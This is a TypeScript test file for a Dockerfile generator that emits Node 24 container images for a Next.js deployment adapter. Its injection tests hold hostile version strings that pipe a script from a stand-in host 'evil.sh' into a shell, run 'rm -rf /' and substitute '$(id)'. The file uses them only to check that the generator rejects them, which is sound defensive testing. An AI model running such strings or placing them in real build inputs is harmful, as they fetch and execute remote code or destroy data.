// tests/emit/dockerfiles.test.ts
import { describe, it, expect } from "vitest";
import {
  generateDockerfile,
  generatePoolDockerfile,
  generateRoutingServiceDockerfile,
  DEFAULT_EMITTED_NODE_VERSION,
  MIN_EMITTED_NODE_MAJOR,
} from "../../src/emit/dockerfiles.js";

// N24 REGRESSION PIN: the routing manifest embeds inline regexp modifiers
// ("(?i:…)", manifest.ts caseInsensitiveSources) that V8 only accepts on Node 24+.
// A node:22 base image throws at manifest load and 500s EVERY request for any app
// with redirects()/headers()/rewrites(). These assertions make a base-image revert
// fail the suite instead of failing in production.
describe("emitted base image is Node >= 24 (inline (?i:) regex support)", () => {
  it("pins the default emitted base image to node:24", () => {
    expect(DEFAULT_EMITTED_NODE_VERSION).toBe("24");
    expect(MIN_EMITTED_NODE_MAJOR).toBe(24);
  });

  it("every emitted Dockerfile defaults to a node:24 base image", () => {
    const dockerfiles = [
      generateDockerfile({ containerStrategy: "shared-image", buildId: "abc123" }),
      generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" }),
      generateRoutingServiceDockerfile({ buildId: "abc123" }),
    ];
    for (const dockerfile of dockerfiles) {
      expect(dockerfile).toMatch(/^FROM node:24-slim$/m);
      expect(dockerfile).not.toContain("node:22");
    }
  });

  it("rejects a base image below Node 24 (cannot compile the manifest's (?i:) wraps)", () => {
    expect(() =>
      generateDockerfile({ containerStrategy: "shared-image", nodeVersion: "22", buildId: "b" }),
    ).toThrow(/Node 24/);
    expect(() =>
      generatePoolDockerfile({ poolName: "ssr", nodeVersion: "23", buildId: "b" }),
    ).toThrow(/inline regexp modifiers/);
    expect(() => generateRoutingServiceDockerfile({ nodeVersion: "junk", buildId: "b" })).toThrow(
      /Unsupported emitted base image/,
    );
  });
});

describe("generateDockerfile", () => {
  it("generates a valid Dockerfile for shared-image strategy", () => {
    const result = generateDockerfile({
      containerStrategy: "shared-image",
      buildId: "abc123",
    });
    expect(result).toContain("FROM node:24-slim");
    expect(result).toContain("WORKDIR /app");
    expect(result).toContain("COPY --chown=node:node . .");
    expect(result).toContain("NEXT_BUILD_ID=abc123");
    expect(result).toContain('CMD ["node", "pool-server.cjs"]');
  });

  // N50 (review #30): the shared-image strategy copies the app's whole node_modules, which
  // holds the BUILD HOST's @img/* platform packages — not linux-x64 — so it needs the same
  // in-image sharp install escape hatch the pool Dockerfile has. Without it, /_next/image
  // 503s ("sharp is unavailable") from a shared image built on a non-linux-x64 host.
  it("emits a pinned in-image sharp install when installSharpVersion is set", () => {
    const result = generateDockerfile({
      containerStrategy: "shared-image",
      buildId: "abc123",
      installSharpVersion: "0.34.5",
    });
    expect(result).toContain(
      "RUN npm install --prefix /tmp/adapter-k8s-sharp --no-save --no-audit --no-fund",
    );
    expect(result).toContain("--os=linux --cpu=x64 --libc=glibc sharp@0.34.5");
    expect(result).toContain("cp -R /tmp/adapter-k8s-sharp/node_modules/. /app/node_modules/");
    expect(result).not.toContain("RUN npm install --no-save");
    expect(result.indexOf("COPY --chown=node:node . .")).toBeLessThan(
      result.indexOf("RUN npm install"),
    );
    expect(result.indexOf("RUN npm install")).toBeLessThan(result.indexOf("USER node"));
  });

  it("rejects an unsafe sharp version (Dockerfile RUN injection)", () => {
    expect(() =>
      generateDockerfile({
        containerStrategy: "shared-image",
        buildId: "abc123",
        installSharpVersion: "0.34.5 && curl evil.sh | sh",
      }),
    ).toThrow(/Unsafe sharp version/);
  });

  it("runs as the non-root node user with node-owned app files", () => {
    const result = generateDockerfile({
      containerStrategy: "shared-image",
      buildId: "abc123",
    });
    expect(result).toContain("USER node");
    // USER must come after COPY (which chowns to node) and before CMD.
    expect(result.indexOf("USER node")).toBeGreaterThan(result.indexOf("COPY --chown=node:node"));
    expect(result.indexOf("USER node")).toBeLessThan(result.indexOf("CMD"));
  });
});

describe("generatePoolDockerfile", () => {
  it("generates a traced-assets Dockerfile with COPY context/ .", () => {
    const result = generatePoolDockerfile({
      poolName: "ssr",
      buildId: "abc123",
    });
    expect(result).toContain("FROM node:24-slim");
    expect(result).toContain("WORKDIR /app");
    expect(result).toContain("COPY --chown=node:node context/ .");
    expect(result).toContain("POOL_NAME=ssr");
    expect(result).toContain("NEXT_BUILD_ID=abc123");
    expect(result).toContain("USER node");
    expect(result).toContain('CMD ["node", "pool-server.cjs"]');
  });

  // REGRESSION (live build XchOtaGFu6GdF…): pool-server.cjs inlines sharp's JS but
  // requires the native binding at runtime (@img/sharp-linux-x64) — the traced-assets
  // image shipped no @img/* packages and every /_next/image 503'd. When the build host
  // cannot stage the linux-x64 pair, the Dockerfile must install sharp in-image.
  it("emits a pinned in-image sharp install when installSharpVersion is set", () => {
    const result = generatePoolDockerfile({
      poolName: "ssr",
      buildId: "abc123",
      installSharpVersion: "0.34.5",
    });
    expect(result).toContain(
      "RUN npm install --prefix /tmp/adapter-k8s-sharp --no-save --no-audit --no-fund",
    );
    expect(result).toContain("--os=linux --cpu=x64 --libc=glibc sharp@0.34.5");
    expect(result).toContain("cp -R /tmp/adapter-k8s-sharp/node_modules/. /app/node_modules/");
    expect(result).not.toContain("RUN npm install --no-save");
    // Must run after the context is copied (needs /app) and before dropping to the
    // non-root user (npm writes node_modules as root at build time).
    expect(result.indexOf("COPY --chown=node:node context/ .")).toBeLessThan(
      result.indexOf("RUN npm install"),
    );
    expect(result.indexOf("RUN npm install")).toBeLessThan(result.indexOf("USER node"));
  });

  it("installs the arm64 binding when the arm64 pair could not be staged", () => {
    const result = generatePoolDockerfile({
      poolName: "ssr",
      buildId: "abc123",
      targetPlatform: "linux/arm64",
      installSharpVersion: "0.35.3",
    });
    expect(result).toContain("Build host had no linux/arm64 sharp binding");
    expect(result).toContain("--os=linux --cpu=arm64 --libc=glibc sharp@0.35.3");
    expect(result).not.toContain("--cpu=x64");
  });

  it("emits no npm install by default (packages staged into the context instead)", () => {
    const result = generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" });
    expect(result).not.toContain("npm install");
  });

  // Validate-at-the-point-of-consumption: the version string lands inside a RUN
  // instruction — a tampered sharp package.json must not inject shell.
  it("rejects a sharp version that is not a plain npm version string", () => {
    for (const bad of ["0.34.5 && curl evil.sh|sh", "0.34.5\nRUN rm -rf /", "$(id)", ""]) {
      expect(() =>
        generatePoolDockerfile({ poolName: "ssr", buildId: "abc123", installSharpVersion: bad }),
      ).toThrow(/Unsafe sharp version/);
    }
  });
});

describe("generateRoutingServiceDockerfile", () => {
  it("generates a Dockerfile for the routing service", () => {
    const result = generateRoutingServiceDockerfile({ buildId: "abc123" });
    expect(result).toContain("FROM node:24-slim");
    expect(result).toContain("routing-service.cjs");
    expect(result).toContain("EXPOSE 8443");
    expect(result).toContain("ENV NEXT_BUILD_ID=abc123");
    expect(result).toContain("COPY --chown=node:node context/ .");
    expect(result).toContain("USER node");
    expect(result).not.toContain("POOL_NAME");
  });

  it("does not bake a TLS cert into the image — the runtime generates one under /tmp/tls", () => {
    const result = generateRoutingServiceDockerfile({ buildId: "abc123" });
    // The per-replica cert is generated at container start (another workstream owns that
    // runtime code); nothing cert-shaped may be baked into an image layer.
    expect(result).not.toContain("openssl req");
    expect(result).not.toContain("tls-cert.pem -out");
    // openssl stays installed for the runtime generation.
    expect(result).toContain("apt-get install -y --no-install-recommends openssl");
    // Cert paths point at the pod's /tmp emptyDir (root FS is read-only).
    expect(result).toContain("TLS_CERT_FILE=/tmp/tls/tls-cert.pem");
    expect(result).toContain("TLS_KEY_FILE=/tmp/tls/tls-key.pem");
  });
});

// Survey batch 2 audits (plans/lessons-from-sibling-adapters.md Tier 5 #26/#28):
// (a) NEXT_ADAPTER_PATH is a BUILD-machine env that activates adapter hooks; carried into the
//     runtime image it changes Next's request-handling branches (adapter-bun deletes it at boot
//     for exactly this reason). The emitted Dockerfiles must never bake it in.
// (b) Four of five official deploy-* templates ship images with no public/ at all (the runner
//     stage never copies it). Ours copies the whole staged context, which includes public/ —
//     pin that the context COPY survives refactors.
describe("emitted Dockerfile hygiene (survey batch 2)", () => {
  const dockerfiles = () => [
    generateDockerfile({ containerStrategy: "shared-image", buildId: "abc123" }),
    generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" }),
    generateRoutingServiceDockerfile({ buildId: "abc123" }),
  ];

  it("never bakes NEXT_ADAPTER_PATH into a runtime image", () => {
    for (const dockerfile of dockerfiles()) {
      expect(dockerfile).not.toContain("NEXT_ADAPTER_PATH");
    }
  });

  it("copies the staged build context (which carries public/) into app images", () => {
    expect(generateDockerfile({ containerStrategy: "shared-image", buildId: "abc123" })).toMatch(
      /^COPY --chown=node:node \. \.$/m,
    );
    expect(generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" })).toMatch(
      /^COPY --chown=node:node context\/ \.$/m,
    );
  });
});
